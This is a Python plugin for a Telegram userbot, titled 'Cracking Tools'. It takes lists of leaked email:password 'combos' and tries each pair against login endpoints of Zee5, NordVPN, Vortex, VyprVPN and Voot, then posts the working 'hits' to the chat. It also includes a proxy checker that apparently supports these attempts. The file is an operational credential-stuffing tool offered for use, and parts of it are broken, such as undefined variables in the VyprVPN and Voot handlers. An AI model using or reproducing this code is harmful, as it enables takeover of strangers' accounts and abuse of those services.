import os

import requests
from uniborg.util import friday_on_cmd

from fridaybot import CMD_HELP
from fridaybot.utils import admin_cmd, friday_on_cmd

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}


face = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Length": "136",
    "Content-Type": "application/json;charset=UTF-8",
    "Host": "userauth.voot.com",
    "Origin": "https://www.voot.com",
    "Referer": "https://www.voot.com",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66",
}


@friday.on(friday_on_cmd(pattern="cz5$"))
async def zee5(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    with open(starky) as f:
        stark_dict = f.read().splitlines()
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        try:
            meke = requests.get(
                f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
            ).json()
        except:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @Infinity_Bots")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cnd$"))
async def vypr(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    with open(starky) as f:
        stark_dict = f.read().splitlines()
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        sedlyf = {"username": email, "password": password}
        try:
            meke = requests.post(
                url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                headers=data,
                json=sedlyf,
            ).json()
        except Exception:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @Infinity_Bots")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cvx$"))
async def vortex(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    with open(starky) as f:
        stark_dict = f.read().splitlines()
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        sedlyf = {"email": email, "pass": password}
        try:
            meke = requests.post(
                url="https://vortex-api.gg/login", headers=data2, json=sedlyf
            ).json()
        except Exception:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @Infinity_Bots")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cvr$"))
async def vortex(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    with open(starky) as f:
        stark_dict = f.read().splitlines()
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        data = {
            "username": email,
            "password": password,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)",
            "Connection": "close",
            "locale": "en",
            "X-GF-PLATFORM": "android",
            "X-GF-PRODUCT": "vyprvpn",
            "X-GF-Agent": "VyprVPN Android v2.6.4.3156. (1b33ca24)",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            meke = requests.get(url=noob, headers=data).text
        except Exception:
            meke = None
        if "invalid username or password" in meke:
            bads += 1
        else:
            hits += 1
            plan = find_between(meke, 'account_level_display": "', '"')
            hits_dict.append(f"{email}:{password} | Plan = {plan}")
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @Infinity_Bots")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


@friday.on(admin_cmd(pattern="proxy"))
async def _(event):
    if event.fwd_from:
        return
    await event.edit(
        "CHECKING PROXIES... PLEASE WAIT. MAY TAKE TIME DEPENDING ON NUMBER OF PROXIES."
    )
    pablo = await event.get_reply_message()
    escobar = await borg.download_media(pablo.media, Config.TMP_DOWNLOAD_DIRECTORY)

    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"

    os.system(cmd)

    file = open("goood.txt", "r")
    Counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            Counter += 1
    file.close()
    if Counter <= 0:
        await event.edit(
            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
        )
    elif Counter >= 1:
        file1 = open("goood.txt", "a")
        file1.write(
            "\nCHECKED BY VirtualUserbot. GET YOUR OWN VirtualUserbot FROM @Infinity_Bots. "
        )
        file1.close()
        await borg.send_file(
            event.chat_id,
            "goood.txt",
            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY FRIDAY. GET YOUR OWN FRIDAY FROM @FRIDAYCHAT.**",
        )
        os.remove(escobar)
        os.remove("goood.txt")


@friday.on(friday_on_cmd(pattern="cvt$"))
async def voot(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    normal_dict = []
    good_dict = []
    hits = 0
    bady = 0
    lol = await event.get_reply_message()
    humm = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    with open(hummu) as f:
        normal_dict = f.read().splitlines()
    os.remove(humm)
    if len(normal_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in normal_dict:
        mmho = i.split(":")
        email = mmho[0]
        try:
            password = mmho[1]
        except IndexError:
            continue
        hell = {
            "type": "traditional",
            "deviceId": "Windows NT 10.0",
            "deviceBrand": "PC/MAC",
            "data": {"email": email, "password": password},
        }
        r = requests.post(
            "https://userauth.voot.com/usersV3/v3/login", json=hell, headers=face
        ).json()
        a = r.get("data")

        kk = r.get("status")

        if a != None:
            hits += 1
            good_dict.append(f"{email}:{password}")

        elif kk != None:
            bady += 1
            c = kk.get("code")
            if c == 1906:
                await event.edit(
                    "voot server is blocking the requests. please try after few minutes..."
                )
                if len(good_dict) == 0:
                    return
                with open("hits.txt", "w") as hitfile:
                    for s in good_dict:
                        hitfile.write(s + " | @FridayOT")
                    await borg.send_file(
                        event.chat_id,
                        "hits.txt",
                        caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`",
                    )
                    os.remove("hits.txt")
                    return

    if len(good_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in good_dict:
            hitfile.write(s + " | @Infinity_Bots")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`",
    )
    os.remove("hits.txt")


CMD_HELP.update(
    {
        "cracking_tools": "**Cracking Tools**\
\n\n**Syntax : **`.cz5 <reply to combo>`\
\n**Usage :** Checks for Zee5 accounts from combo.\
\n\n**Syntax : **`.cnd <reply to combo>`\
\n**Usage :** Checks for VYPR accounts from combo.\
\n\n**Syntax : **`.cvt <reply to combo>`\
\n**Usage :** Checks for Voot accounts from combo.\
\n\n**Syntax : **`.cvx <reply to combo>`\
\n**Usage :** Checks for Vortex accounts from combo.\
\n\n**Syntax : **`.cz5 <reply to combo>`\
\n**Usage :** Checks for Zee5 accounts from combo.\
\n\n**Syntax : **`.proxy <reply to proxies file>`\
\n**Usage :** Checks for alive proxies."
    }
)
